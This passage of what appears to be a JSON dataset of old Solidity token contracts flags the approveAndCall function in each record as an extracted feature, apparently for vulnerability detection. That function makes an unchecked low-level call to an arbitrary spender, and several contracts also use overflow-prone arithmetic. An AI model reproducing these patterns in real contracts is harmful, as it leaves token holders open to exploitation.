_tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1467"
  },
  "filename": "31443.sol",
  "content": "pragma solidity ^0.4.14;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract RawToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function RawToken(\n ) {\n balances[msg.sender] = 42000000000000000000000000;\n totalSupply = 42000000000000000000000000;\n name = \"RawToken\";\n decimals = 18;\n symbol = \"RAW\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1468"
  },
  "filename": "31445.sol",
  "content": "pragma solidity ^0.4.16;\ncontract WHITEMONEYToken {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\nlibrary ABCMaths {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b > 0);\n uint256 c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n address public newOwner;\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier validAddress(address _address) {\n require(_address != 0x0);\n _;\n }\n function transferOwnership(address _newOwner) onlyOwner {\n if (_newOwner != address(0)) {\n owner = _newOwner;\n }\n }\n function acceptOwnership() {\n require(msg.sender == newOwner);\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n event OwnershipTransferred(address indexed _from, address indexed _to);\n}\ncontract WCOStandardToken is WHITEMONEYToken, Ownable {\n using ABCMaths for uint256;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n mapping (address => bool) public frozenAccount;\n event FrozenFunds(address target, bool frozen);\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function freezeAccount(address target, bool freeze) onlyOwner {\n frozenAccount[target] = freeze;\n FrozenFunds(target, freeze);\n }\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (frozenAccount[msg.sender]) return false;\n require(\n (balances[msg.sender] >= _value)\n && (_value > 0)\n && (_to != address(0))\n && (balances[_to].add(_value) >= balances[_to])\n && (msg.data.length >= (2 * 32) + 4));\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (frozenAccount[msg.sender]) return false;\n require(\n (allowed[_from][msg.sender] >= _value)\n && (balances[_from] >= _value)\n && (_value > 0)\n && (_to != address(0))\n && (balances[_to].add(_value) >= balances[_to])\n && (msg.data.length >= (2 * 32) + 4)\n );\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract WHITEMONEY is WCOStandardToken {\n uint256 constant public decimals = 8;\n uint256 public totalSupply = 20 * (10**7) * 10**8 ;\n string constant public name = \"White Money\";\n string constant public symbol = \"WCO\";\n function WHITEMONEY(){\n balances[msg.sender] = totalSupply;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1469"
  },
  "filename": "31446.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PrincapilityOfLiechtensteinToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function PrincapilityOfLiechtensteinToken(\n ) {\n balances[msg.sender] = 38000;\n totalSupply = 38000;\n name = \"PrincapilityOfLiechtensteinToken\";\n decimals = 0;\n symbol = \"LIET\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb146a"
  },
  "filename": "31453.sol",
  "content": "pragma solidity ^0.4.14;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract RawToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function RawToken(\n ) {\n balances[msg.sender] = 42000000;\n totalSupply = 42000000;\n name = \"BBK Tobacco & Foods LLP\";\n decimals = 18;\n symbol = \"RAW\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb146b"
  },
  "filename": "31454.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EthereumUranium is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EthereumUranium(\n ) {\n balances[msg.sender] = 2100000000000000;\n totalSupply = 2100000000000000;\n name = \"Ethereum Uranium\";\n decimals = 8;\n symbol = \"ETHUC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb146c"
  },
  "filename": "31456.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Bitloanex is StandardToken {\n function () {\n throw;\n }\n string public name = 'Bitloanex';\n uint8 public decimals = 8;\n string public symbol = 'BTLX';\n string public version = 'H1.0';\n function Bitloanex(\n ) {\n balances[msg.sender] = 10000000000000000;\n totalSupply = 10000000000000000;\n name = \"Bitloanex\";\n decimals = 8;\n symbol = \"BTLX\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb146d"
  },
  "filename": "31489.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ShackCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ShackCoin(\n ) {\n balances[msg.sender] = 1000000;\n totalSupply = 1000000;\n name = \"ShackCoin\";\n decimals = 0;\n symbol = \"SHACK\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb146e"
  },
  "filename": "31491.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Koin is StandardToken {\n function () {\n throw;\n }\n string public name = 'Koin';\n uint8 public decimals = 18;\n string public symbol = 'KOIN';\n string public version = 'H1.0';\n function Koin(\n ) {\n balances[msg.sender] = 1000000000000000000000000000000000;\n totalSupply = 1000000000000000000000000000000000;\n name = \"Koin\";\n decimals = 18;\n symbol = \"KOIN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb146f"
  },
  "filename": "31528.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract JLSCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'J1.0';\n function JLSCoin(\n ) {\n balances[msg.sender] = 50000000*10**8;\n totalSupply = 50000000*10**8;\n name = \"Jules Coin\";\n decimals = 8;\n symbol = \"JLS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1470"
  },
  "filename": "31530.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BitLoanex is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BitLoanex(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 90000000;\n name = \"Bitloanex\";\n decimals = 8;\n symbol = \"BTLX\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1471"
  },
  "filename": "31545.sol",
  "content": "pragma solidity ^0.4.14;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) 